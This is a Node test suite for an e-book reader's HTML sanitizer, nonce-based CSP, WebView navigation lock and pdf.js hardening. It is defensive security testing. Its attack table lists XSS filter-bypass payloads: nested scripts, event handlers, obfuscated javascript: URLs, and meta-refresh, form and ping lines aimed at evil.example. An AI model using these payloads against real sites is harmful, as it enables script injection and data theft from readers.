// Segurança do conteúdo do livro no Reader: filtro que reconstrói as tags, CSP com nonce, links externos e CSS do capítulo.
// Cada ataque abaixo passava pelo filtro antigo (verificação de 12/11/2026). Node puro; a execução real da CSP é coberta
// pelas suítes Chromium do Reader. Não comprova WebView Android.
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const ts = require('typescript');

const cache = new Map();
function load(file) {
  if (cache.has(file)) return cache.get(file);
  const exports = {}; cache.set(file, exports);
  const code = ts.transpileModule(fs.readFileSync(file, 'utf8'), { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } }).outputText;
  new Function('require', 'exports', code)(name => {
    const base = name.startsWith('@/') ? name.slice(2) : path.posix.join(path.posix.dirname(file), name);
    const target = ['.ts', '.tsx', ''].map(extension => base + extension).find(candidate => fs.existsSync(candidate) && fs.statSync(candidate).isFile());
    return target ? load(target) : require(name);
  }, exports);
  return exports;
}
const { sanitizeBookHtml, isSafeBookUrl } = load('src/domain/reader/sanitizeBookHtml.ts');
const { createEpubReaderDocument } = load('src/presentation/components/EpubReaderDocument.ts');

// Leitura das tags como o navegador faz (aspas contam dentro da tag). Depois do filtro só existem as reemitidas por ele.
const TAGS = /<(\/?)([a-zA-Z][^\s/>]*)((?:"[^"]*"|'[^']*'|[^'">])*)>/g;
const tags = html => [...html.matchAll(TAGS)].map(match => match[0]);
const BLOCKED = new Set(['script', 'iframe', 'frame', 'object', 'embed', 'applet', 'form', 'meta', 'base', 'link', 'plaintext']);
const URLS = new Set(['href', 'src', 'xlink:href', 'poster', 'data', 'background', 'action', 'formaction']);
function hasActiveContent(html) {
  for (const match of html.matchAll(TAGS)) {
    if (BLOCKED.has(match[2].toLowerCase())) return true;
    for (const attribute of match[3].matchAll(/([^\s"'<>/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+)))?/g)) {
      const name = attribute[1].toLowerCase(), value = attribute[2] ?? attribute[3] ?? attribute[4] ?? '';
      if (name.startsWith('on') || ['srcdoc', 'formaction', 'action', 'http-equiv', 'ping', 'target'].includes(name)) return true;
      if (URLS.has(name) && !isSafeBookUrl(value)) return true;
    }
  }
  return false;
}

const attacks = {
  'script aninhado': '<scr<script>ipt>window.PWNED=1</scr<script>ipt>',
  'script aninhado com fechamento': '<scr<script></script>ipt>window.PWNED=1</scr<script></script>ipt>',
  'script sem fechamento': '<p>a</p><script>window.PWNED=1//',
  'script com fechamento espaçado': '<script >window.PWNED=1</script >',
  'onerror sem espaço': '<img src="x"onerror=window.PWNED=1>',
  'onerror com barra': '<img/onerror=window.PWNED=1 src=x>',
  'onerror com aspas simples': "<img src='x' ONERROR='window.PWNED=1'>",
  'svg onload': '<svg/onload=window.PWNED=1>',
  'javascript com entidade': '<a href="java&#115;cript:window.PWNED=1">x</a>',
  'javascript com entidade sem ponto e vírgula': '<a href="java&#x73cript:window.PWNED=1">x</a>',
  'javascript com tabulação': '<a href="java\tscript:window.PWNED=1">x</a>',
  'javascript com entidade nomeada': '<a href="javascript&colon;window.PWNED=1">x</a>',
  'javascript em maiúsculas com espaços': '<a href="  JaVaScRiPt:window.PWNED=1">x</a>',
  'data html': '<a href="data:text/html,<script>window.PWNED=1</script>">x</a>',
  'meta refresh aninhado': '<me<meta>ta http-equiv="refresh" content="0;url=https://evil.example/">',
  'meta refresh': '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  'base': '<base href="https://evil.example/">',
  'iframe srcdoc': '<iframe srcdoc="<script>window.PWNED=1</script>"></iframe>',
  'form action': '<form action="https://evil.example/"><input name="senha"></form>',
  'formaction': '<button formaction="javascript:window.PWNED=1">ok</button>',
  'object': '<object data="https://evil.example/x.swf"></object>',
  'comentário escondendo script': '<!--><script>window.PWNED=1</script>-->',
  'atributo sem aspas fechando tag': '<a title=x"y><img src=x onerror=window.PWNED=1><p title="z">',
  'style fechando por dentro de atributo': '<style><a title="</style><img src=x onerror=window.PWNED=1>">',
  'plaintext': '<plaintext><p>resto do documento</p>',
  'tag sem fechamento com manipulador': '<img src="x" onerror="window.PWNED=1',
  'srcset com javascript': '<img srcset="javascript:window.PWNED=1 1x, x.png 2x">',
  'style com expression': '<p style="width:expression(window.PWNED=1)">x</p>',
  'target e ping': '<a href="https://example.com/" target="_top" ping="https://evil.example/p">x</a>',
};
for (const [name, html] of Object.entries(attacks)) {
  const clean = sanitizeBookHtml(html);
  assert.ok(!hasActiveContent(clean), `${name}: sobrou conteúdo ativo em ${JSON.stringify(clean)}`);
  assert.equal(sanitizeBookHtml(clean), clean, `${name}: filtro não é idempotente`);
  for (const tag of tags(clean)) assert.match(tag, /^<\/?[a-z][a-z0-9:-]*(?: [a-z_:][a-z0-9_:.-]*(?:="[^"<]*")?)*(?: \/)?>$/, `${name}: tag fora do formato reemitido: ${tag}`);
}
assert.equal(sanitizeBookHtml('<a href="https://example.com/" target="_top" ping="https://evil.example/p">x</a>'), '<a href="https://example.com/">x</a>');
assert.equal(sanitizeBookHtml('<style>p{color:red}'), '<style>p{color:red}</style>', 'style sem fechamento é fechado');
assert.equal(sanitizeBookHtml('a < b e c > d'), 'a &lt; b e c > d');

// Conteúdo legítimo de livros continua igual no que importa.
const legit = '<h1 class="t" id="c1">Capítulo</h1><p style="text-indent:1em" epub:type="bodymatter">Texto <em>com</em> ênfase &amp; nota<a href="#fn1" id="r1">1</a>.</p>'
  + '<img src="data:image/png;base64,AAAA" alt="Figura" data-pdf-reflow-image="1"/><svg viewBox="0 0 10 10"><image xlink:href="data:image/png;base64,BBBB" width="10" height="10"/></svg>'
  + '<a href="chapter2.xhtml#x">próximo</a><a href="https://example.org/obra">site</a><table><tr><td colspan="2">x</td></tr></table>';
const kept = sanitizeBookHtml(legit);
for (const expected of ['<h1 class="t" id="c1">', 'style="text-indent:1em"', 'epub:type="bodymatter"', '&amp; nota', '<a href="#fn1" id="r1">', 'src="data:image/png;base64,AAAA"', 'data-pdf-reflow-image="1"',
  'xlink:href="data:image/png;base64,BBBB"', '<a href="chapter2.xhtml#x">', '<a href="https://example.org/obra">', '<td colspan="2">', '<svg viewbox="0 0 10 10">'])
  assert.ok(kept.includes(expected), `conteúdo legítimo perdido: ${expected}\n${kept}`);
assert.equal(kept.replace(/<[^>]+>/g, ''), legit.replace(/<[^>]+>/g, ''), 'o texto do livro não muda');
for (const [url, safe] of [['#fn1', true], ['cap2.xhtml', true], ['../img/a.png', true], ['https://example.org/', true], ['mailto:a@b.c', true], ['data:image/png;base64,AA', true], ['blob:https://x/1', true],
  ['javascript:alert(1)', false], ['JAVA\nSCRIPT:alert(1)', false], ['vbscript:x', false], ['data:text/html,x', false], ['data:image/svg+xml,<svg/>', true], ['intent://x#Intent;end', false], ['&#106;avascript:x', false]])
  assert.equal(isSafeBookUrl(url), safe, url);

// Documento do Reader: CSP com nonce, um único script (o do Reader), nada do livro executável, links externos presos.
const options = { fontSize: 16, fontFamily: 'Georgia', marginSize: 20, textColor: '#111111', backgroundColor: '#ffffff' };
const chapter = html => [{ id: 'c', title: 't', html, characterCount: 1 }];
const hostile = '<html><head><style>p{color:red}</style ><script>window.PWNED=1</script><style>x{}</style></head><body>' + Object.values(attacks).join('\n') + '</body></html>';
const doc = createEpubReaderDocument(chapter(hostile), options);
const nonce = doc.match(/script-src 'nonce-([a-f0-9]{32})'/)?.[1];
assert.ok(nonce, 'CSP com nonce de 128 bits');
assert.ok(!/script-src[^;]*unsafe-inline/.test(doc), "script-src sem 'unsafe-inline'");
for (const directive of ["default-src 'none'", "connect-src 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "frame-src 'none'"]) assert.ok(doc.includes(directive), directive);
const scripts = [...doc.matchAll(/<script\b[^>]*>/gi)].map(match => match[0]);
assert.deepEqual(scripts, [`<script nonce="${nonce}">`], 'só o script do Reader, com o nonce');
const section = doc.slice(doc.indexOf('<section id="epub-chapter-0"'), doc.indexOf('<script nonce='));
assert.ok(!hasActiveContent(section.replace(/^<section[^>]*>/, '')), 'nada ativo do livro no documento');
assert.ok(!doc.includes(`onerror="this.dataset.epubError`), 'o próprio Reader não usa mais manipulador embutido (a CSP o bloquearia)');
assert.ok(!section.includes('</style ><script>'), 'CSS do capítulo não fecha o bloco de estilo');
assert.notEqual(createEpubReaderDocument(chapter('<p>a</p>'), options).match(/nonce-([a-f0-9]+)/)[1], nonce, 'nonce novo a cada documento');
assert.ok(createEpubReaderDocument(chapter('<p>a</p>'), { ...options, scriptNonce: 'abcdef0123456789abcdef' }).includes(`<script nonce="abcdef0123456789abcdef">`));
{ const injected = createEpubReaderDocument(chapter('<p>a</p>'), { ...options, scriptNonce: `x' 'unsafe-inline` });
  assert.match(injected, /script-src 'nonce-[a-f0-9]{32}';/, 'nonce inválido é ignorado e trocado por um sorteado');
  assert.ok(!/script-src[^;]*unsafe-inline/.test(injected), 'nonce inválido não injeta diretiva na CSP'); }
const script = doc.slice(doc.indexOf('<script nonce='), doc.lastIndexOf('</script>'));
assert.match(script, /href\.charAt\(0\) !== "#"\) \{ event\.preventDefault\(\); return; \}/, 'link externo não navega o Reader');
assert.match(script, /addEventListener\("error"[\s\S]{0,160}epubError = "true"/, 'falha de imagem marcada por ouvinte');
assert.doesNotMatch(script, /\beval\(|new Function\(|setTimeout\(\s*["']/, 'o script do Reader não depende de eval');
// Imagem legítima mantém o carregamento esperado.
const images = createEpubReaderDocument(chapter('<p><img src="data:image/png;base64,AA" alt="a"><img data-pdf-reflow-image src="data:image/png;base64,BB"></p>'), options);
assert.ok(images.includes('<img src="data:image/png;base64,AA" alt="a" loading="lazy" />') && images.includes('<img data-pdf-reflow-image src="data:image/png;base64,BB" loading="eager" />'));

// Navegação das WebViews nativas e versões do pdf.js.
const nav = load('src/domain/reader/readerNavigationPolicy.ts');
for (const url of ['https://aldus-reader.local/', 'https://aldus-reader.local/#epub-chapter-2', 'about:blank', 'about:srcdoc']) assert.equal(nav.allowReaderNavigation(url), true, url);
for (const url of ['https://evil.example/', 'https://aldus-reader.local.evil.example/', 'https://aldus-reader.local/x', 'http://aldus-reader.local/', 'intent://x#Intent;end', 'javascript:alert(1)', 'file:///data/x', 'data:text/html,x', '', undefined])
  assert.equal(nav.allowReaderNavigation(url), false, String(url));
for (const file of ['src/presentation/components/EpubPageViewer.native.tsx', 'src/presentation/components/PdfPageViewer.native.tsx', 'src/presentation/components/PdfReflowProcessor.native.tsx']) {
  const source = fs.readFileSync(file, 'utf8');
  assert.match(source, /onShouldStartLoadWithRequest=\{request => allowReaderNavigation\(request\.url\)\}/, file + ': navegação presa ao documento');
  assert.ok(!/allowUniversalAccessFromFileURLs|allowFileAccessFromFileURLs|allowFileAccess\b/.test(source), file + ': sem acesso a arquivos na WebView');
  assert.ok(source.includes('READER_BASE_URL'), file);
}
for (const file of ['src/presentation/components/PdfPageViewer.native.tsx', 'src/presentation/components/PdfReflowProcessor.native.tsx']) {
  const source = fs.readFileSync(file, 'utf8');
  const calls = source.match(/getDocument\(\{[\s\S]{0,800}?\}\)/g) ?? [];
  assert.ok(calls.length >= 1 && calls.every(call => /isEvalSupported:\s*false/.test(call)), file + ': pdf.js 3.x precisa de isEvalSupported:false (CVE-2024-4367)');
  const tag = source.match(/<script src="https:\/\/cdnjs\.cloudflare\.com\/ajax\/libs\/pdf\.js\/3\.11\.174\/pdf\.min\.js"[^>]*>/)?.[0] ?? '';
  assert.match(tag, /integrity="sha512-[A-Za-z0-9+/=]{80,}"/, file + ': script do CDN com integridade'); assert.match(tag, /crossorigin="anonymous"/);
}
// Leitor antigo (RenderHTML): mesmo filtro e links sem efeito.
{ const renderer = fs.readFileSync('src/presentation/components/ChapterRenderer.tsx', 'utf8');
  for (const expected of ['source={{ html: sanitizeBookHtml(chapter.html) }}', 'renderersProps={bookLinks}', 'a: { onPress: () => undefined }'])
    assert.ok(renderer.includes(expected), 'ChapterRenderer: ' + expected); }
console.log(`PASS book HTML security: ${Object.keys(attacks).length} ataques neutralizados e filtro idempotente, conteúdo legítimo preservado, CSP com nonce e um único script, links externos presos, WebViews sem navegação nem acesso a arquivos, pdf.js sem eval e com integridade. Sem WebView Android.`);
